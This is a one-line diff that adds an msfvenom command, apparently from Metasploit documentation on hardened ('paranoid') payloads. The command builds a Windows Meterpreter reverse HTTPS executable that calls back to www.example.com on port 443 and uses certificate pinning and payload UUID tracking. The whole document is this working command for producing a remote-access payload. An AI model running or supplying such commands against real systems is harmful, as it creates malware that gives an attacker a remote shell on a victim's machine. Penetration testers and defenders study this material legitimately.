@@ -1,0 +1,1 @@
+$ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe
